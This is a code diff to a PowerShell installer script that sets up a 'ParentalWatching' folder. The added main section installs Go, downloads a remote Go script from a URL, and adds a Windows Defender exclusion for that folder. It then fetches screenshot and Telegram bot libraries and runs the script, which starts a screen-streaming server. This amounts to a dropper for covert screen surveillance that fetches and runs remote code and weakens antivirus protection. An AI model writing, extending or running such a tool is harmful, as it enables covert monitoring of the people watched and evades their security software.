@@ -167,7 +167,7 @@ function Run-GoScript($GoFile) {
         if ($Response.StatusCode -eq 200) {
             Log "MJPEG server started successfully on localhost:5000"
         } else {
-            Log "MJPEG server failed to start. Check if port 5000 is in use or review %TEMP%\monitor_bot.log."
+            Log "MJPEG server failed to start. Check if port 5000 is in use or review %USERPROFILE%\monitor_bot.log."
             return $false
         }
         return $true
@@ -200,11 +200,66 @@ function Install-GoDependencies($GoFile) {
         Log "Initializing Go module"
         $Proc = Start-Process -FilePath "go" -ArgumentList "mod", "init", "monitoring" -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -RedirectStandardError (Join-Path $DestFolder "go_mod_error.log") -ErrorAction Stop
         if ($Proc.ExitCode -ne 0) {
-            $ErrorLog = Get-Content (Join-Path $DestFolder "go_mod_error.log") -Raw
+            $ErrorLog = Get-Content (Join-Path $DestFolder "go_mod_error.log") -Raw -ErrorAction SilentlyContinue
             Log "Failed to initialize Go module: exit code $($Proc.ExitCode). Error: $ErrorLog"
             return $false
         }
         Log "Fetching dependencies"
         $Proc = Start-Process -FilePath "go" -ArgumentList "get", "-v", "github.com/kbinani/screenshot", "github.com/go-telegram-bot-api/telegram-bot-api/v5" -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -RedirectStandardError (Join-Path $DestFolder "go_get_error.log") -ErrorAction Stop
         if ($Proc.ExitCode -ne 0) {
-            $ErrorLog = Get-Content (Join-Path $DestFolder "go_get_error.log") -Raw
+            $ErrorLog = Get-Content (Join-Path $DestFolder "go_get_error.log") -Raw -ErrorAction SilentlyContinue
+            Log "Failed to install dependencies: exit code $($Proc.ExitCode). Error: $ErrorLog"
+            return $false
+        }
+        Log "Dependencies installed successfully"
+        return $true
+    } catch {
+        Log "Dependency install error: $_"
+        return $false
+    }
+}
+
+# Main
+Log "Script started. DestFolder: $DestFolder, Url: $Url"
+if (-not (Test-Path $DestFolder)) {
+    Log "Creating destination folder: $DestFolder"
+    New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null
+}
+if (-not (Test-Path $DestFolder)) {
+    Log "Failed to create destination folder: $DestFolder. Exiting."
+    Write-Host "Error: Could not create folder 'ParentalWatching'. Check permissions."
+    exit 1
+}
+
+# Convert GitHub blob URL to raw
+if ($Url -match "github.com/.+/blob/(.+)$") {
+    $Url = $Url -replace "https://github.com/", "https://raw.githubusercontent.com/" -replace "/blob/", "/"
+    Log "Converted blob URL to raw: $Url"
+}
+
+# Download Go MSI and install
+if (-not (Install-Go)) {
+    Log "Go installation failed. Exiting."
+    exit 1
+}
+
+# Download Go script
+if (-not (Download-File $Url $GoFilePath)) {
+    Log "Failed to download Go script. Exiting."
+    exit 1
+}
+
+# Add Defender exclusion
+Add-DefenderExclusion $DestFolder
+
+# Install dependencies and run
+if (-not (Install-GoDependencies $GoFilePath)) {
+    Log "Failed to install dependencies. Exiting."
+    exit 1
+}
+if (-not (Run-GoScript $GoFilePath)) {
+    Log "Failed to run Go script. Exiting."
+    exit 1
+}
+
+Log "Script completed successfully."
